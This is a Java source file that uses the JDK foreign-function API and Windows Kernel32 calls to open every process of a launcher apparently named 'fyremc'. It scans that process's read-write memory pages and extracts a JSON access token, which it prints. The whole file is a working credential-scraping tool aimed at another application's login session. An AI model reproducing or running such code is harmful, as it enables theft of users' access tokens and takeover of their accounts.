package azahriah.nemhibas.jdktest;

import azahriah.nemhibas.jdktest.natives.windows.kernel32.Kernel32;
import azahriah.nemhibas.jdktest.natives.windows.kernel32._MEMORY_BASIC_INFORMATION;
import jdk.incubator.foreign.*;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
    private static final int CHUNK_SIZE = 4069;

    public static void main(String[] args) {
        System.out.println("Porog a fornettigyar");
        ExecutorService executor = Executors.newFixedThreadPool(8);

        List<ProcessHandle> processes = ProcessHandle.allProcesses()
            .filter(proc -> proc.info().command().orElse("").toLowerCase().contains("fyremc"))
            .filter(proc -> proc.children().findAny().isPresent())
            .toList();

        if (processes.isEmpty()) {
            System.out.println("[!] The launcher is not running.");
            return;
        }

        processes.forEach(proc ->
            executor.execute(() -> {
                System.out.printf("[!] Searching token in process %d...%n", proc.pid());
                String result = tryFindAccessToken(proc.pid());
                if (!result.isEmpty()) System.out.printf("[!] Found something in %d (P): %s%n", proc.pid(), result);
            })
        );
        executor.shutdown();
    }

    public static String tryFindAccessToken(long pid) {
        MemoryAddress handle = Kernel32.OpenProcess(Kernel32.PROCESS_ALL_ACCESS(), 0, (int) pid);

        try {
            if (handle == MemoryAddress.NULL) {
                throw new RuntimeException("failed to open handle");
            }

            try (ResourceScope scope = ResourceScope.newConfinedScope()) {
                SegmentAllocator segmentAllocator = SegmentAllocator.ofScope(scope);
                MemorySegment buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, CHUNK_SIZE);

                MemorySegment memoryInfo = _MEMORY_BASIC_INFORMATION.allocate(scope);

                String pageSlice = "";

                for (MemoryAddress pagePointer = MemoryAddress.ofLong(0);
                        Kernel32.VirtualQueryEx(handle, pagePointer, memoryInfo, _MEMORY_BASIC_INFORMATION.sizeof()) != 0;
                        pagePointer = pagePointer.addOffset(_MEMORY_BASIC_INFORMATION.RegionSize$get(memoryInfo))) {

                    if (_MEMORY_BASIC_INFORMATION.State$get(memoryInfo) != Kernel32.MEM_COMMIT() ||
                            _MEMORY_BASIC_INFORMATION.Protect$get(memoryInfo) != Kernel32.PAGE_READWRITE()) continue;

                    MemoryAddress pageEndPointer = pagePointer.addOffset(_MEMORY_BASIC_INFORMATION.RegionSize$get(memoryInfo));
                    for (MemoryAddress readPointer = pagePointer;
                            readPointer.toRawLongValue() < pageEndPointer.toRawLongValue();
                            readPointer = readPointer.addOffset(CHUNK_SIZE)) {

                        if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, CHUNK_SIZE, MemoryAddress.NULL) == 0)
                            continue;

                        String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);

                        if (!pageSlice.isEmpty()) {
                            int index = bufferString.indexOf("}");
                            if (index > -1) {
                                pageSlice += bufferString.substring(0, index+2);
                                return "{\""+pageSlice;
                            }
                            pageSlice = "";
                        }

                        Iterator<String> slices = Arrays.stream(bufferString.split("\\{\"")).iterator();

                        slices.next();

                        int endIdx = -1;
                        while (slices.hasNext()) {
                            String slice = slices.next();

                            if (!slice.startsWith("acc")) continue;

                            if (slices.hasNext()) {
                                slice += "{\"";
                                slice += slices.next();
                                endIdx = slice.indexOf("}");
                            }

                            if (endIdx == -1) {
                                pageSlice = slice;
                                break;
                            }

                            slice = slice.substring(0, endIdx);
                            return "{\""+slice+"}}";
                        }
                    }
                }
            }
        } finally {
            Kernel32.CloseHandle(handle);
        }
        return "";
    }
}
